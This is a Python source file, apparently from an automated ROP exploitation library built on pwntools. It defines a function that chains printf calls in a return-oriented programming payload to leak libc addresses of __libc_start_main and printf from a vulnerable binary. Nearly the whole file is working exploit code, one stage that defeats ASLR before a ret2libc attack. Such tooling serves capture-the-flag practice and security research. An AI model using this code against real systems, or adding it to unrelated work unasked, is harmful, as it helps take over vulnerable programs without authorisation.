from autorop import PwnState, arutil
from pwn import ROP


def printf(state: PwnState) -> PwnState:
    """Leak libc addresses using ``printf``.

    This function leaks the libc addresses of ``__libc_start_main`` and ``printf``
    using ``printf``, placing them in ``state.leaks``.

    Arguments:
        state: The current ``PwnState`` with the following set

            - ``target``: What we want to exploit.
            - ``_elf``: pwntools ``ELF`` of ``state.binary_name``.
            - ``overwriter``: Function which writes rop chain to the "right place".
            - ``vuln_function``: Name of vulnerable function in binary,
              which we can return to repeatedly.

    Returns:
        Mutated ``PwnState``, with the following updated

            - ``target``: The instance of target from which we got a successful leak.
              Hopefully it can still be interacted with.
            - ``leaks``: Updated with ``"symbol": address`` pairs for each
              function address of libc that was leaked.
    """
    LEAK_FUNCS = ["__libc_start_main", "printf"]

    def leaker(rop: ROP, address: int) -> ROP:
        arutil.align_call(rop, "printf", [address])
        assert state._elf is not None
        # must send newline to satisfy ``arutil.leak_helper``
        arutil.align_call(rop, "printf", [next(state._elf.search(b"\n\x00"))])
        return rop

    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
